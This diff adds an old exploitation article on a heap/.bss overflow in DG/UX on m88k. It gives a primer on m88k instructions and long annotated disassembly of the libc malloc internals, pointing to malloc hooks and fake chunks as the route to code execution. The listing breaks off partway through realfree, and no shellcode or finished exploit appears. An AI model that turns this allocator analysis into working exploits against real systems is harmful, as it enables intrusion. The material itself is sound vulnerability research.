@@ -1,0 +1,921 @@
+                                                          _   _:.
+                                                           :$$$$$
+         _   .     - +.                                   :l$³³$$
+   s¿¿,,_  +:@QSSS$$$$$                                    ``
+   $$$$$$$$bs¿.`"Ù?$$$l       [ DGUX Heap Overflow ]
+   'ÀÀ?$$³$$$$b¿_  .        [ hirezia ] 
+            `"À$³$b.   .     [ root@localhost ]
+                  `À?b.  `.   
+                     `Ù.   +
+                      `$   _.
+                        `
+
+ In this article described practically use of heap overflow on DG/UX.
+
+
+ Basic course about m88k processor register and instructions:
+
+ All instructions 4 bytes long.
+ All constants in big-endian bytes order.
+
+ Registers:
+        
+        r0      - 0
+        r1      - return address of function
+        r2-r5   - function parameters     
+        r6-r7   - just for fun
+        r9      - used for store syscall number 
+        r10-r24 - just for fun
+        r25     - .got table in shared libraries 
+        r26-r29 - just for fun
+        r30     - base pointer
+        r31     - stack pointer
+         
+
+ Instructions:
+ 
+ ld       r2,0x001038cc  <- load in register r2, data from address 0x001038cc
+ st       r2,0x001038cc  <- save register r2 on address 0x001038cc
+ bsr.n    <strcpy>       <- call function with execute next instruction
+                            before call in r1 - address of instruction + 0x08
+ bsr      <strcpy>       <- call without execution next instruction            
+                            in r1 - address of instruction + 0x04
+ br       <strcpy>       <- unconditional jump
+ br.n     <strcpy>       <- conditional jump with execute next instruction     
+ subu     r30,r31,0x50   <- r30=r31 - 0x50
+ addu     r30,r31,0x50   <- r30=r31 + 0x50
+ bcnd.n   eq0,r13, <malloc+68>  <- conditionall (if eq 0)jump with next 
+                                   instruction execute. eq0 - equality; 
+                                   other prefixes of that instruction u  
+                                   may found in gas sources.
+ or.u     r24,r0,0xabcd  <- load 0xabcd in high word in r24 
+ or       r24,r0,0xabcd  <- load 0xabcd in low  word in r24
+ ld       r3,r22[r11]    <- r3 = *(r22+r11)
+ jmp      r1             <- unconditional jump on r1
+        
+        
+ Look at part of program code:
+
+                           ld       r2,OUR VICTIM       
+  1038cc:   f4 76 16 0b    ld       r3,r22[r11]   <-- Variables defined as part
+                                                      of  argument  as  example
+                                                      ARGV[1]
+
+  1038d0:   cf ff fc 76    bsr.n    <strcpy>      <-- HEAP OVERFLOW
+  1038d4:   f4 40 58 19    or       r2,r0,r25
+
+ Registers state:
+
+  r2 -> 11EDEC          - located in  .bss
+  
+  r3 ->  0xeffff513     -> 'AAAAAA...'
+  r31 -> 0xeffff360     -> base pointer
+  r22 -> 0xeffff4b0     -> argv
+  r11 -> 0x00000001     -> argument number.
+  
+ In our case,we overflow not heap,but .bss - but it not big difference,because:
+
+ 1)  Other variables in .bss for our lucky not used (or used but not very much)
+     for the time when called malloc.
+
+ 2)  Memory,which needed for fake chunk create,already mapped and enough for us
+
+ So, lets see some interesting - algo of heap allocations and free.
+
+ Starting with malloc - main interest of its function,its possibility of malloc
+ debugging, with hooks, it was used later for code execution.
+
+ In the beginning,I want pay attention on code part 0x8005f930 - 0x8005f938. In 
+ r25 register,we are wrote address of global offset table,by the following way:
+
+    bsr.n             - calling function, in this case, just jump on next 
+                        instruction,in $r1 stored current eip. Postfix .n 
+                        - means, what  next after jump, command also will 
+                        executed
+
+    or r25,r25,0xbd40 - store in register $r25 value 0xbd40
+
+    addu r25,r25,r1   - adding our constant 0xbd40 to eip - so, if constant 
+                        right (of course choice its compiler problem)and in
+                        $r25 we have get address of .got  table, that allow
+                        our shared  library, successful and  easy accessing
+                        their internal data. that trick very good for write
+                        long shellcodes. I didn't see any  later changes of 
+                        $r25 register in  libraries function, so we  may be
+                        sure that r25 equality of .got.
+
+
+---------------------------------------------------------- begin of malloc.S
+
+$r25 = 0x800ab678
+$r25,0x24 = ADDRESS OF PRE HOOK FLAG
+$r25,0x28 + 0x20 - incoming variables for hook
+($r25,0x24)+0x08 = ADDRESS OF POST HOOK FLAG.
+
+
+0x8005f920 <malloc>:    subu            r31,r31,0x50
+0x8005f924 <malloc+4>:  st.d            r24,r31,0x28
+0x8005f928 <malloc+8>:  or.u            r25,r0,0x04
+0x8005f92c <malloc+12>: st              r1,r31,0x30
+
+0x8005f930 <malloc+16>: bsr.n            <malloc+24>
+0x8005f934 <malloc+20>: or              r25,r25,0xbd40
+0x8005f938 <malloc+24>: addu            r25,r25,r1
+
+if (hooked) else <malloc+68>
+
+0x8005f93c <malloc+28>: ld              r13,r25,0x24    
+0x8005f940 <malloc+32>: ld              r13,r0,r13
+0x8005f944 <malloc+36>: bcnd.n          eq0,r13, <malloc+68>
+0x8005f948 <malloc+40>: or              r24,r0,r2
+0x8005f94c <malloc+44>: ld              r2,r25,0x28
+
+0x8005f950 <malloc+48>: jsr.n           r13                     !!!!!!!!!!!!!!
+
+0x8005f954 <malloc+52>: addu            r2,r2,0x20
+0x8005f958 <malloc+56>: bcnd            eq0,r2, <malloc+68>
+0x8005f95c <malloc+60>: bsr.n            <__sev_sh_lib_err>
+0x8005f960 <malloc+64>: ld              r2,r25,0x2c
+
+0x8005f964 <malloc+68>: bsr.n            <__dg_malloc_unlocked>
+0x8005f968 <malloc+72>: or              r2,r0,r24
+
+0x8005f96c <malloc+76>: ld              r13,r25,0x24
+0x8005f970 <malloc+80>: ld              r13,r13,0x08
+0x8005f974 <malloc+84>: bcnd.n          eq0,r13, <malloc+116>
+0x8005f978 <malloc+88>: or              r24,r0,r2
+
+0x8005f97c <malloc+92>: ld              r2,r25,0x28
+
+0x8005f980 <malloc+96>: jsr.n           r13                     !!!!!!!!!!!!!!!
+
+0x8005f984 <malloc+100>:addu            r2,r2,0x20
+0x8005f988 <malloc+104>:bcnd            eq0,r2, <malloc+116>
+0x8005f98c <malloc+108>:bsr.n            <__sev_sh_lib_err>
+0x8005f990 <malloc+112>:ld              r2,r25,0x30
+
+0x8005f994 <malloc+116>:ld              r1,r31,0x30
+0x8005f998 <malloc+120>:or              r2,r0,r24
+0x8005f99c <malloc+124>:ld.d            r24,r31,0x28
+0x8005f9a0 <malloc+128>:jmp.n           r1
+0x8005f9a4 <malloc+132>:addu            r31,r31,0x50
+  
+---------------------------------------------------------- end of malloc.S
+
+ So, as u see, malloc not doing nothing interesting, so just going in 
+ __dg_malloc_unlocked.
+ 
+ It  more  interesting. That function, core of dg/ux mallocs, their do all, and
+ free  memory,  and add memory. Free - only flagged chunk as not used, but this
+ function and work with chunks lists. So, if interesting u may analyze all jump
+ in  this function, but for get positive result and replace any 4 byte with any
+ 4 byte,we needed initiate collector of old chunks.
+
+ How we initiate it from  __dg_malloc_unlocked its dosnt matter.
+
+ Main  things  that  doing  this  function(also  needed to mention that algo of
+ memory  allocation  very  similar  with  'System  V  AT&T' , that described in
+ http://phrack.org/phrack/57/p57-0x09 , is at that algo or not is unknown but C
+ examples from that article was very useful):
+
+>  (r25,0x444) if on address of this variable is 0 (it usually on first malloc)
+   going to the end   
+
+>  calling cleanfree (showing later)
+
+>  next, testing if size less than ( 0x4F (79)) calling  smalloc else
+   going next.
+
+>__dg_malloc_unlocked - for big parts of memory
+>       r25,0x450 - 0x800ad4a8 - 0 on first pass 
+>       r25,0x454 - 0x800ad4ac - 0 on first pass
+
+> calling _morecore -> dobrk :) + mark flags
+
+> size of mapped memory  - *morecore
+
+> cleaning working information  +  block begin = size and on offset 0x10
+  cleaning second bit (flag)
+
+>  calculating  size  that  remain  after  our  chunk  in memory that mapped by
+  _morecore (their map 4kb parts) and comparise them with 0x5f (header + 0x4f).
+   If more, then write size of our chunk in begin.
+
+> marked next chunk for ready          
+
+> calculate where will header of our (its not chunk what passed to malloc) 
+  chunk.
+
+> (begin + (4k - size needed for us) - 10) and write size here
+
+> cleaning of that chunk
+
+> realfree
+
+----------------------------------------------- begin of __dg_malloc_unlocked.S
+
+  (r25,0x444) if on address of this variable is 0 (it usually on first malloc)
+   going to the end   
+
+
+0x8005faf0 <_func>:      subu            r31,r31,0x50
+0x8005faf4 <_func+4>:    st.d            r24,r31,0x38
+
+0x8005faf8 <_func+8>:    or.u            r25,r0,0x04
+
+0x8005fafc <_func+12>:   st.d            r22,r31,0x30
+0x8005fb00 <_func+16>:   or              r22,r0,r2
+0x8005fb04 <_func+20>:   st              r1,r31,0x40
+0x8005fb08 <_func+24>:   bsr.n            <_func+32>
+
+0x8005fb0c <_func+28>:   or              r25,r25,0xbb68   r25 = 0x0004bb68
+0x8005fb10 <_func+32>:   st.d            r20,r31,0x28
+if (razmer<0) nahuy
+0x8005fb14 <_func+36>:   bcnd.n          lt0,r22, <_func+436>
+0x8005fb18 <_func+40>:   addu            r25,r25,r1     <- EBANUTAYA FICHA
+if (razmer kraten 16)
+0x8005fb1c <_func+44>:   mask            r12,r22,0x0f
+0x8005fb20 <_func+48>:   bcnd.n          eq0,r12, <_func+60>
+0x8005fb24 <_func+52>:   addu            r13,r22,0x10   ;razmer+0x10
+
+0x8005fb28 <_func+56>:   subu            r22,r13,r12 -> okruglit do 16
+
+0x8005fb2c <_func+60>:   ld              r9,r25,0x444 -> ssilka kakayato 
+                                                         r9 0x800ad4b4
+                                                        
+0x8005fb30 <_func+64>:   ld              r2,r0,r9     -> prochitali to chto tam
+                                                         esli eta huynia == 0
+                                                         goto hz kuda 
+
+0x8005fb34 <_func+68>:   bcnd.n          eq0,r2, <_func+200>
+
+0x8005fb38 <_func+72>:   subu            r23,r2,0x10
+
+0x8005fb3c <_func+76>:   tb1             0x01,r0,0xff
+
+0x8005fb40 <_func+80>:   ld              r10,r0,r23
+0x8005fb44 <_func+84>:   and             r10,r10,0xfffc
+0x8005fb48 <_func+88>:   cmp             r12,r10,r22
+0x8005fb4c <_func+92>:   bb1.n           0x03,r12, <_func+136>
+0x8005fb50 <_func+96>:   cmp             r13,r22,0x4f
+0x8005fb54 <_func+100>:  ld              r13,r25,0x448
+0x8005fb58 <_func+104>:  ld              r12,r0,r13
+0x8005fb5c <_func+108>:  ld              r11,r25,0x44c
+0x8005fb60 <_func+112>:  addu            r12,r12,0x1f
+0x8005fb64 <_func+116>:  st              r0,r0,r9
+0x8005fb68 <_func+120>:  mask            r12,r12,0x1f
+0x8005fb6c <_func+124>:  st              r12,r0,r13
+0x8005fb70 <_func+128>:  br.n             <_func+592>
+0x8005fb74 <_func+132>:  st              r0,r11[r12]
+
+0x8005fb78 <_func+136>:  and             r13,r13,r12
+0x8005fb7c <_func+140>:  extu            r13,r13,1<8>
+0x8005fb80 <_func+144>:  bcnd            eq0,r13, <_func+200>
+0x8005fb84 <_func+148>:  ld              r12,r25,0x448
+0x8005fb88 <_func+152>:  ld              r13,r0,r12
+0x8005fb8c <_func+156>:  ld              r11,r25,0x44c
+0x8005fb90 <_func+160>:  addu            r13,r13,0x1f
+0x8005fb94 <_func+164>:  st              r0,r0,r9
+0x8005fb98 <_func+168>:  mask            r13,r13,0x1f
+0x8005fb9c <_func+172>:  st              r13,r0,r12
+0x8005fba0 <_func+176>:  st              r0,r11[r13]
+0x8005fba4 <_func+180>:  tb1             0x01,r0,0xff
+0x8005fba8 <_func+184>:  ld              r13,r0,r23
+0x8005fbac <_func+188>:  st              r10,r0,r23
+0x8005fbb0 <_func+192>:  br.n             <_func+468>
+0x8005fbb4 <_func+196>:  mask            r20,r13,0x02
+
+0x8005fbb8 <_func+200>:  bsr.n            <cleanfree>
+0x8005fbbc <_func+204>:  or              r2,r0,0
+
+0x8005fbc0 <_func+208>:  cmp             r13,r22,0x4f
+0x8005fbc4 <_func+212>:  bb0.n           0x09,r13, <_func+232>
+0x8005fbc8 <_func+216>:  or              r20,r0,0
+0x8005fbcc <_func+220>:  or              r2,r0,r22
+0x8005fbd0 <_func+224>:  bsr.n            <_smalloc>
+0x8005fbd4 <_func+228>:  addu            r1,r1,0x168
+
+0x8005fbd8 <_func+232>:  ld              r13,r25,0x450
+0x8005fbdc <_func+236>:  ld              r2,r0,r13
+0x8005fbe0 <_func+240>:  or              r23,r0,0
+0x8005fbe4 <_func+244>:  bcnd.n          eq0,r2, <_func+384>
+0x8005fbe8 <_func+248>:  or              r10,r0,0
+
+0x8005fbec <_func+252>:  or              r24,r0,r2
+0x8005fbf0 <_func+256>:  tb1             0x01,r0,0xff
+0x8005fbf4 <_func+260>:  ld              r13,r0,r24
+0x8005fbf8 <_func+264>:  cmp             r13,r13,r22
+0x8005fbfc <_func+268>:  bb1             0x0a,r13, <_func+320>
+0x8005fc00 <_func+272>:  bcnd            eq0,r10, <_func+288>
+0x8005fc04 <_func+276>:  ld              r13,r0,r24
+0x8005fc08 <_func+280>:  cmp             r13,r10,r13
+0x8005fc0c <_func+284>:  bb1             0x0a,r13, <_func+300>
+0x8005fc10 <_func+288>:  or              r23,r0,r24
+0x8005fc14 <_func+292>:  tb1             0x01,r0,0xff
+0x8005fc18 <_func+296>:  ld              r10,r0,r24
+0x8005fc1c <_func+300>:  tb1             0x01,r0,0xff
+0x8005fc20 <_func+304>:  ld              r13,r24,0x20
+0x8005fc24 <_func+308>:  bcnd            eq0,r13, <_func+340>
+0x8005fc28 <_func+312>:  ld              r24,r24,0x20
+0x8005fc2c <_func+316>:  br               <_func+256>
+0x8005fc30 <_func+320>:  tb1             0x01,r0,0xff
+0x8005fc34 <_func+324>:  ld              r13,r24,0x30
+0x8005fc38 <_func+328>:  bcnd            eq0,r13, <_func+340>
+0x8005fc3c <_func+332>:  ld              r24,r24,0x30
+0x8005fc40 <_func+336>:  br               <_func+256>
+0x8005fc44 <_func+340>:  bcnd.n          eq0,r23, <_func+356>
+0x8005fc48 <_func+344>:  or              r2,r0,r23
+0x8005fc4c <_func+348>:  bsr.n            <t_delete>
+0x8005fc50 <_func+352>:  addu            r1,r1,0x1c
+0x8005fc54 <_func+356>:  ld              r21,r25,0x450
+0x8005fc58 <_func+360>:  ld              r13,r0,r21
+0x8005fc5c <_func+364>:  cmp             r13,r24,r13
+0x8005fc60 <_func+368>:  bb0             0x03,r13, <_func+384>
+0x8005fc64 <_func+372>:  bsr.n            <t_splay>
+0x8005fc68 <_func+376>:  or              r2,r0,r24
+0x8005fc6c <_func+380>:  st              r24,r0,r21
+
+0x8005fc70 <_func+384>:  bcnd            ne0,r23, <_func+444>
+0x8005fc74 <_func+388>:  ld              r13,r25,0x454
+0x8005fc78 <_func+392>:  ld              r2,r0,r13
+0x8005fc7c <_func+396>:  bcnd            eq0,r2, <_func+420>
+
+0x8005fc80 <_func+400>:  tb1             0x01,r0,0xff
+0x8005fc84 <_func+404>:  ld              r13,r0,r2
+0x8005fc88 <_func+408>:  cmp             r13,r22,r13
+0x8005fc8c <_func+412>:  bb1.n           0x09,r13, <_func+444>
+0x8005fc90 <_func+416>:  or              r23,r0,r2
+
+0x8005fc94 <_func+420>:  bsr.n            <_morecore>
+0x8005fc98 <_func+424>:  or              r2,r0,r22
+
+0x8005fc9c <_func+428>:  or              r23,r0,r2
+0x8005fca0 <_func+432>:  bcnd            ne0,r23, <_func+444>
+0x8005fca4 <_func+436>:  br.n             <_func+592>
+0x8005fca8 <_func+440>:  or              r2,r0,0
+
+0x8005fcac <_func+444>:  tb1             0x01,r0,0xff
+0x8005fcb0 <_func+448>:  ld              r12,r0,r23
+0x8005fcb4 <_func+452>:  addu            r12,r23,r12
+0x8005fcb8 <_func+456>:  ld              r13,r12,0x10
+0x8005fcbc <_func+460>:  and             r13,r13,0xfffd
+0x8005fcc0 <_func+464>:  st              r13,r12,0x10
+
+0x8005fcc4 <_func+468>:  tb1             0x01,r0,0xff
+0x8005fcc8 <_func+472>:  ld              r13,r0,r23
+0x8005fccc <_func+476>:  subu            r10,r13,r22
+0x8005fcd0 <_func+480>:  cmp             r13,r10,0x5f
+0x8005fcd4 <_func+484>:  bb1             0x09,r13, <_func+528>
+0x8005fcd8 <_func+488>:  st              r22,r0,r23
+
+0x8005fcdc <_func+492>:  tb1             0x01,r0,0xff
+0x8005fce0 <_func+496>:  ld              r13,r0,r23
+0x8005fce4 <_func+500>:  subu            r10,r10,0x10
+0x8005fce8 <_func+504>:  addu            r13,r23,r13
+
+0x8005fcec <_func+508>:  or              r12,r10,0x01
+0x8005fcf0 <_func+512>:  addu            r2,r13,0x20
+0x8005fcf4 <_func+516>:  st              r12,r13,0x10
+0x8005fcf8       <_func+520>:  bsr.n            <realfree>
+0x8005fcfc <_func+524>:  addu            r1,r1,0x28
+
+
+0x8005fd00 <_func+528>:  tb1             0x01,r0,0xff
+0x8005fd04 <_func+532>:  ld              r13,r0,r23
+0x8005fd08 <_func+536>:  ld              r12,r25,0x458
+0x8005fd0c <_func+540>:  addu            r13,r13,r23
+0x8005fd10 <_func+544>:  ld              r12,r0,r12
+0x8005fd14 <_func+548>:  addu            r13,r13,0x20
+0x8005fd18 <_func+552>:  cmp             r13,r13,r12
+0x8005fd1c <_func+556>:  bb1             0x03,r13, <_func+568>
+0x8005fd20 <_func+560>:  ld              r13,r25,0x454
+0x8005fd24 <_func+564>:  st              r0,r0,r13
+
+0x8005fd28 <_func+568>:  tb1             0x01,r0,0xff
+0x8005fd2c <_func+572>:  ld              r13,r0,r23
+0x8005fd30 <_func+576>:  or              r13,r13,0x01
+0x8005fd34 <_func+580>:  addu            r2,r23,0x10
+0x8005fd38 <_func+584>:  or              r13,r13,r20
+0x8005fd3c <_func+588>:  st              r13,r0,r23
+0x8005fd40 <_func+592>:  ld              r1,r31,0x40
+0x8005fd44 <_func+596>:  ld.d            r24,r31,0x38
+0x8005fd48 <_func+600>:  ld.d            r22,r31,0x30
+0x8005fd4c <_func+604>:  ld.d            r20,r31,0x28
+0x8005fd50 <_func+608>:  jmp.n           r1
+0x8005fd54 <_func+612>:  addu            r31,r31,0x50
+
+------------------------------------------------- end of __dg_malloc_unlocked.S
+
+ So time to understand how in this algorithm chunks creating.
+
+ ?hunk header have minimum size in 0x10 bytes.
+
+ chunk_header = mem_pointer - 0x10
+
+
+  ----------------------------------------------------------- middle chunk  
+          length   |                               |
+            | flags|                               |
+   6 bit    | 2bit | 8 bit     |8 bit     |8 bit   |
+     0000000010    0000000000 0000000000 0000000000  <- header 
+     AAAAAAAAAA    AAAAAAAAAA AAAAAAAAAA AAAAAAAAAA  <- data
+
+  -----------------------------------------------------------
+
+ Length of chunk always divisible on 4.So,it possible to use 2 bits of a length
+ for service info. Chunks consists of three various types, algo of allocate  in
+ which very different.
+
+
+ 1) small - less then 0x4F (that constant, coz of upper function description).
+
+ 2) middle - more then 0x4F,but less 4k - that's chunks in which when out space
+    always mapped 4k, but all other space give for small chunk.
+
+ 3) big - chunks  for which mapped more then 4kb.
+
+ In  our  program  first  malloc  after  overflow was 0x400 bytes,so its middle
+ chunk,  so  algo  of  middle  chunks  allocate  will discuss. That chunks is a
+ bi-directional list.
+
+ So  as  u  see,  __dg_malloc_unlocked   for create chunk  call cleanfree - for
+ cleaned all not used chunks purposes. But it a wrapper for realfree.
+
+---------------------------------------------------------- begin of cleanfree.S
+
+x80060928 <cleanfree>:  subu            r31,r31,0x40
+0x8006092c <cleanfree+4>:       st.d            r24,r31,0x28
+0x80060930 <cleanfree+8>:       or.u            r25,r0,0x04
+0x80060934 <cleanfree+12>:      st              r1,r31,0x30
+0x80060938 <cleanfree+16>:      bsr.n            <cleanfree+24>
+0x8006093c <cleanfree+20>:      or              r25,r25,0xad38
+0x80060940 <cleanfree+24>:      st.d            r22,r31,0x20
+0x80060944 <cleanfree+28>:      addu            r25,r25,r1
+
+0x80060948 <cleanfree+32>:      ld              r13,r25,0x448
+0x8006094c <cleanfree+36>:      ld              r12,r25,0x44c   0x800ad4b8
+0x80060950 <cleanfree+40>:      ld              r13,r0,r13      0
+0x80060954 <cleanfree+44>:      or              r23,r0,r12
+0x80060958 <cleanfree+48>:      or              r22,r0,r2
+0x8006095c <cleanfree+52>:      lda             r24,r23[r13]  ??????
+0x80060960 <cleanfree+56>:      cmp             r13,r24,r23
+0x80060964 <cleanfree+60>:      bb1             0x03,r13, <cleanfree+68>
+
+0x80060968 <cleanfree+64>:      addu            r24,r24,0x80
+0x8006096c <cleanfree+68>:      subu            r24,r24,0x04
+
+0x80060970 <cleanfree+72>:      ld              r2,r0,r24
+0x80060974 <cleanfree+76>:      bcnd.n          eq0,r2, <cleanfree+100>
+0x80060978 <cleanfree+80>:      cmp             r13,r2,r22
+0x8006097c <cleanfree+84>:      bb0             0x03,r13, <cleanfree+92>
+0x80060980 <cleanfree+88>:      bsr              <realfree>
+0x80060984 <cleanfree+92>:      br.n             <cleanfree+56>
+0x80060988 <cleanfree+96>:      st              r0,r0,r24
+
+0x8006098c <cleanfree+100>:     ld              r13,r25,0x448
+0x80060990 <cleanfree+104>:     ld              r12,r25,0x444
+0x80060994 <cleanfree+108>:     st              r0,r0,r13
+0x80060998 <cleanfree+112>:     st              r0,r0,r12
+0x8006099c <cleanfree+116>:     ld              r1,r31,0x30
+0x800609a0 <cleanfree+120>:     ld.d            r24,r31,0x28
+0x800609a4 <cleanfree+124>:     ld.d            r22,r31,0x20
+0x800609a8 <cleanfree+128>:     jmp.n           r1
+0x800609ac <cleanfree+132>:     addu            r31,r31,0x40
+
+----------------------------------------------------------- end of cleanfree.S
+
+ The  main task of realfree its walking via bi-directional list and except from
+ it (t_delete) deleted chunks.
+
+realfree
+>       get chunk size - (r2-0x10)
+>       aligned it for %4
+>       test it with  0x4f
+>       see on next chunk 
+>       if chunk on this situation last, then doing next actions,            
+        else  doing t_delete for chunk 
+>       marking *(chank_head+0x40) = 0
+>       marking *(chank_head+0x30) = 0
+>       marking *(chank_head+0x20) = 0
+>       marking *(chank_head+0x10) = 0
+>       load on next chunk address his values
+>       next
+>       r25,0x458 - 0x800ad4b0 - 0
+>       r25,0x454 - on that address write end of cleaned chunk
+>       setup on chunk 10
+
+
+----------------------------------------------------------- begin of realfree.S
+
+0x800600f0 <realfree>:  subu            r31,r31,0x50
+0x800600f4 <realfree+4>:        st              r1,r31,0x40
+0x800600f8 <realfree+8>:        st.d            r24,r31,0x38
+0x800600fc <realfree+12>:       or.u            r25,r0,0x04
+0x80060100 <realfree+16>:       st.d            r22,r31,0x30
+0x80060104 <realfree+20>:       subu            r23,r2,0x10
+0x80060108 <realfree+24>:       st              r21,r31,0x2c
+0x8006010c <realfree+28>:       bsr.n            <realfree+36>
+0x80060110 <realfree+32>:       or              r25,r25,0xb564
+0x80060114 <realfree+36>:       tb1             0x01,r0,0xff
+0x80060118 <realfree+40>:       ld              r21,r0,r23
+
+0x8006011c <realfree+44>:       bb0.n           0,r21, <realfree+576>
+0x80060120 <realfree+48>:       addu            r25,r25,r1
+
+0x80060124 <realfree+52>:       ld              r13,r0,r23
+0x80060128 <realfree+56>:       and             r13,r13,0xfffc
+0x8006012c <realfree+60>:       st              r13,r0,r23
+
+0x80060130 <realfree+64>:       tb1             0x01,r0,0xff
+0x80060134 <realfree+68>:       ld              r13,r0,r23
+0x80060138 <realfree+72>:       cmp             r13,r13,0x4f
+
+0x8006013c <realfree+76>:       bb0             0x09,r13, <realfree+112>
+
+0x80060140 <realfree+80>:       ld              r13,r0,r23
+0x80060144 <realfree+84>:       extu            r13,r13,0<4>
+0x80060148 <realfree+88>:       ld              r12,r25,0x440
+0x8006014c <realfree+92>:       subu            r21,r13,0x01
+0x80060150 <realfree+96>:       ld              r13,r12[r21]
+0x80060154 <realfree+100>:      st              r13,r0,r2
+0x80060158 <realfree+104>:      br.n             <realfree+576>
+0x8006015c <realfree+108>:      st              r23,r12[r21]
+
+0x80060160 <realfree+112>:      tb1             0x01,r0,0xff
+
+0x80060164 <realfree+116>:      ld              r13,r0,r23
+0x80060168 <realfree+120>:      addu            r22,r23,r13
+0x8006016c <realfree+124>:      ld              r13,r22,0x10
+
+0x80060170 <realfree+128>:      bb1.n           0,r13, <realfree+184>
+0x80060174 <realfree+132>:      addu            r24,r22,0x10
+
+0x80060178 <realfree+136>:      ld              r13,r25,0x454
+0x8006017c <realfree+140>:      ld              r13,r0,r13
+0x80060180 <realfree+144>:      cmp             r13,r24,r13
+0x80060184 <realfree+148>:      bb0             0x03,r13, <realfree+160>
+0x80060188 <realfree+152>:      bsr.n            <t_delete>
+0x8006018c <realfree+156>:      or              r2,r0,r24
+0x80060190 <realfree+160>:      tb1             0x01,r0,0xff
+0x80060194 <realfree+164>:      ld              r13,r0,r23
+0x80060198 <realfree+168>:      ld              r12,r22,0x10
+0x8006019c <realfree+172>:      addu            r13,r13,0x10
+0x800601a0 <realfree+176>:      addu            r13,r13,r12
+0x800601a4 <realfree+180>:      st              r13,r0,r23
+
+0x800601a8 <realfree+184>:      bb0.n           0x01,r21, <realfree+232>
+0x800601ac <realfree+188>:      subu            r13,r0,0x10
+0x800601b0 <realfree+192>:      ld              r24,r23,r13
+0x800601b4 <realfree+196>:      bsr.n            <t_delete>
+0x800601b8 <realfree+200>:      or              r2,r0,r24
+0x800601bc <realfree+204>:      tb1             0x01,r0,0xff
+0x800601c0 <realfree+208>:      ld              r13,r0,r24
+0x800601c4 <realfree+212>:      ld              r12,r0,r23
+0x800601c8 <realfree+216>:      addu            r13,r13,0x10
+0x800601cc <realfree+220>:      or              r23,r0,r24
+0x800601d0 <realfree+224>:      addu            r13,r13,r12
+0x800601d4 <realfree+228>:      st              r13,r0,r23
+
+0x800601d8 <realfree+232>:      st              r0,r23,0x40
+0x800601dc <realfree+236>:      tb1             0x01,r0,0xff
+0x800601e0 <realfree+240>:      ld              r13,r23,0x40
+0x800601e4 <realfree+244>:      st              r13,r23,0x30
+0x800601e8 <realfree+248>:      tb1             0x01,r0,0xff
+0x800601ec <realfree+252>:      ld              r13,r23,0x30
+0x800601f0 <realfree+256>:      st              r13,r23,0x20
+0x800601f4 <realfree+260>:      tb1             0x01,r0,0xff
+0x800601f8 <realfree+264>:      ld              r13,r23,0x20
+0x800601fc <realfree+268>:      st              r13,r23,0x10
+0x80060200 <realfree+272>:      tb1             0x01,r0,0xff
+
+0x80060204 <realfree+276>:      ld              r13,r0,r23
+0x80060208 <realfree+280>:      st              r23,r23,r13
+
+0x8006020c <realfree+284>:      ld              r13,r0,r23
+0x80060210 <realfree+288>:      ld              r12,r25,0x458
+0x80060214 <realfree+292>:      addu            r13,r13,r23
+0x80060218 <realfree+296>:      ld              r12,r0,r12
+0x8006021c <realfree+300>:      addu            r13,r13,0x20
+0x80060220 <realfree+304>:      cmp             r13,r13,r12
+0x80060224 <realfree+308>:      bb1             0x03,r13, <realfree+324>
+0x80060228 <realfree+312>:      ld              r13,r25,0x454
+
+0x8006022c <realfree+316>:      br.n             <realfree+552>
+0x80060230 <realfree+320>:      st              r23,r0,r13
+
+0x80060234 <realfree+324>:      ld              r13,r25,0x450
+0x80060238 <realfree+328>:      ld              r2,r0,r13
+0x8006023c <realfree+332>:      bcnd            eq0,r2, <realfree+548>
+0x80060240 <realfree+336>:      tb1             0x01,r0,0xff
+0x80060244 <realfree+340>:      ld              r12,r0,r23
+0x80060248 <realfree+344>:      or              r24,r0,r2
+0x8006024c <realfree+348>:      or              r11,r0,r13
+0x80060250 <realfree+352>:      subu            r10,r0,0x01
+0x80060254 <realfree+356>:      tb1             0x01,r0,0xff
+0x80060258 <realfree+360>:      ld              r13,r0,r24
+0x8006025c <realfree+364>:      cmp             r13,r13,r12
+0x80060260 <realfree+368>:      bb1             0x09,r13, <realfree+400>
+0x80060264 <realfree+372>:      ld              r13,r24,0x20
+0x80060268 <realfree+376>:      bcnd            eq0,r13, <realfree+388>
+0x8006026c <realfree+380>:      ld              r24,r24,0x20
+0x80060270 <realfree+384>:      br               <realfree+356>
+0x80060274 <realfree+388>:      st              r23,r24,0x20
+0x80060278 <realfree+392>:      st              r24,r23,0x10
+0x8006027c <realfree+396>:      br               <realfree+552>
+0x80060280 <realfree+400>:      tb1             0x01,r0,0xff
+0x80060284 <realfree+404>:      ld              r13,r0,r24
+0x80060288 <realfree+408>:      cmp             r13,r13,r12
+0x8006028c <realfree+412>:      bb0             0x0a,r13, <realfree+444>
+0x80060290 <realfree+416>:      ld              r13,r24,0x30
+0x80060294 <realfree+420>:      bcnd            eq0,r13, <realfree+432>
+0x80060298 <realfree+424>:      ld              r24,r24,0x30
+0x8006029c <realfree+428>:      br               <realfree+356>
+0x800602a0 <realfree+432>:      st              r23,r24,0x30
+0x800602a4 <realfree+436>:      st              r24,r23,0x10
+0x800602a8 <realfree+440>:      br               <realfree+552>
+0x800602ac <realfree+444>:      tb1             0x01,r0,0xff
+0x800602b0 <realfree+448>:      ld              r12,r24,0x10
+0x800602b4 <realfree+452>:      bcnd            eq0,r12, <realfree+488>
+0x800602b8 <realfree+456>:      ld              r13,r12,0x20
+0x800602bc <realfree+460>:      cmp             r13,r24,r13
+0x800602c0 <realfree+464>:      bb1             0x03,r13, <realfree+476>
+0x800602c4 <realfree+468>:      st              r23,r12,0x20
+0x800602c8 <realfree+472>:      br               <realfree+480>
+0x800602cc <realfree+476>:      st              r23,r12,0x30
+0x800602d0 <realfree+480>:      st              r12,r23,0x10
+0x800602d4 <realfree+484>:      br               <realfree+492>
+0x800602d8 <realfree+488>:      st              r23,r0,r11
+0x800602dc <realfree+492>:      tb1             0x01,r0,0xff
+0x800602e0 <realfree+496>:      ld              r12,r24,0x20
+0x800602e4 <realfree+500>:      bcnd            eq0,r12, <realfree+508>
+0x800602e8 <realfree+504>:      st              r23,r12,0x10
+0x800602ec <realfree+508>:      st              r12,r23,0x20
+0x800602f0 <realfree+512>:      tb1             0x01,r0,0xff
+0x800602f4 <realfree+516>:      ld              r12,r24,0x30
+0x800602f8 <realfree+520>:      bcnd            eq0,r12, <realfree+528>
+0x800602fc <realfree+524>:      st              r23,r12,0x10
+0x80060300 <realfree+528>:      st              r12,r23,0x30
+0x80060304 <realfree+532>:      st              r24,r23,0x40
+0x80060308 <realfree+536>:      st              r23,r24,0x10
+0x8006030c <realfree+540>:      st              r10,r24,0x20
+0x80060310 <realfree+544>:      br               <realfree+552>
+
